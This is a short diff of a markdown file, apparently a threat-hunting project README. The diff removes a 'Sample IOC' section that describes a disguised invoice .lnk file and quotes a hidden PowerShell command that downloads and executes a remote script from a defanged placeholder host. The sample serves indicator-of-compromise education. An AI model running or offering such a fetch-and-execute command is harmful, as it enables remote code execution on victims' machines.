@@ -82,10 +82,3 @@ s.png)
 - Threat hunting and IOC identification
 
 ---
-
-## 📎 Sample IOC (Indicator of Compromise)
-
-```text
-Filename: ImportantInvoice-Febrary.zip
-Extracted: disguised_invoice.lnk
-PowerShell command: powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious[.]site/shell.ps1')"
